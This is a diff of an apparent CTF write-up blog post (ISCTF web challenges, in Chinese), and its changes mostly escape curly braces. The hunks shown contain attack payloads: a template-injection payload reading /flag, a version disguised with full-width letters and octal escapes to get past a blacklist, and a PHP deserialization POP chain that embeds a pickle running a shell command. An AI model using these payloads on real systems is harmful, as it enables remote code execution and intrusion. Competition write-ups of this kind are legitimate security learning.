@@ -1,10 +1,11 @@
 ---
+
 title: ISCTF
 date: 2025-12-04T00:15:16Z
 author: Xendr1a
+
 ---
 
-{% raw %}
 # ISCTF（web部分
 
 ## b@by n0t1ce b0ard
@@ -179,7 +180,7 @@ echo "blueshark:".$b;
 BLACKLIST = ["b","c","d","e","h","i","j","k","m","n","o","p","q","r","s","t","u","v","w","x","y","z","%",";",",","<",">",":","?"]
 ```
 
-我们构造`{{__import__('os').popen('cat /flag').read()}}`
+我们构造`&#123;&#123;__import__('os').popen('cat /flag').read()}}`
 
 函数名和变量名可以用全角字符绕过
 
@@ -205,7 +206,7 @@ print(ascii_to_fullwidth("read"))
 里面命令可以用进制绕过
 
 ```php
-{{ __ｉｍｐｏｒｔ__('\157\163').ｐｏｐｅｎ('\143\141\164\040\057\146\154\141\147').ｒｅａｄ() }}
+&#123;&#123; __ｉｍｐｏｒｔ__('\157\163').ｐｏｐｅｎ('\143\141\164\040\057\146\154\141\147').ｒｅａｄ() &#125;&#125;
 ```
 
 然后打包成zip文件上传
@@ -1045,7 +1046,7 @@ class ret2game(Exception):
             location.replace("{self.url}");
         </script>
         <style>
-            body{{font-family:system-ui;padding:24px}}
+            body&#123;&#123;font-family:system-ui;padding:24px&#125;&#125;
         </style>
     </head>
     <body>
@@ -1493,12 +1494,12 @@ def generate():
     # Pytools 对象：用于 run.php 触发 Python
     s_pytools = 'O:7:"Pytools":0:{}'
     # Shark 对象：负责把 Pytools 写入 run.bin
-    s_shark = f'O:5:"Shark":1:{{s:3:"ser";s:{len(s_pytools)}:"{s_pytools}";}}'
+    s_shark = f'O:5:"Shark":1:&#123;&#123;s:3:"ser";s:{len(s_pytools)}:"{s_pytools}";&#125;&#125;'
     # Writer 对象：负责把我们的 pickle 写入 write.bin
     # 注意：init 必须传 "init" 字符串，绕过 __wakeup 的逻辑，确保目录被创建
-    s_writer = f'O:6:"Writer":2:{{s:7:"b64data";s:{len(b64_pickle)}:"{b64_pickle}";s:4:"init";s:4:"init";}}'
+    s_writer = f'O:6:"Writer":2:&#123;&#123;s:7:"b64data";s:{len(b64_pickle)}:"{b64_pickle}";s:4:"init";s:4:"init";&#125;&#125;'
     # Bridge 对象：POP 链入口
-    s_bridge = f'O:6:"Bridge":2:{{s:6:"writer";{s_writer}s:5:"shark";{s_shark}}}'
+    s_bridge = f'O:6:"Bridge":2:&#123;&#123;s:6:"writer";{s_writer}s:5:"shark";{s_shark&#125;&#125;}'
     # 加上index.php要求的前缀
     final_payload = "blueshark:" + s_bridge
     print(final_payload)
@@ -1506,7 +1507,7 @@ def generate():
 if __name__ == "__main__":
     generate()
 
-#blueshark:O:6:"Bridge":2:{s:6:"writer";O:6:"Writer":2:{s:7:"b64data";s:188:"gASVgQAAAAAAAACMCF9fbWFpbl9flIwDU2V0lJOUKYGUfZQojAZzZWNyZXSUQwhrYXFpa2FxaZSMB3BheWxvYWSUQ0SABJU5AAAAAAAAAIwFcG9zaXiUjAZzeXN0ZW2Uk5SMHmNhdCAvZmxhZyA+IC90bXAvc3N4bC9vdXRzLnR4dJSFlFKULpR1Yi4=";s:4:"init";s:4:"init";}s:5:"shark";O:5:"Shark":1:{s:3:"ser";s:18:"O:7:"Pytools":0:{}";}}
+#blueshark:O:6:"Bridge":2:{s:6:"writer";O:6:"Writer":2:{s:7:"b64data";s:188:"gASVgQAAAAAAAACMCF9fbWFpbl9flIwDU2V0lJOUKYGUfZQojAZzZWNyZXSUQwhrYXFpa2FxaZSMB3BheWxvYWSUQ0SABJU5AAAAAAAAAIwFcG9zaXiUjAZzeXN0ZW2Uk5SMHmNhdCAvZmxhZyA+IC90bXAvc3N4bC9vdXRzLnR4dJSFlFKULpR1Yi4=";s:4:"init";s:4:"init";}s:5:"shark";O:5:"Shark":1:{s:3:"ser";s:18:"O:7:"Pytools":0:{}";&#125;&#125;
 ```
 
 需要在Linux环境跑，因为
@@ -1536,4 +1537,3 @@ if __name__ == "__main__":
 怎么说呢，就只写了解多的，说实话自己还是有点太依赖ai了，这个习惯得改，狠狠的改，继续加油吧，诶~
 
 ‍
-{% endraw %}
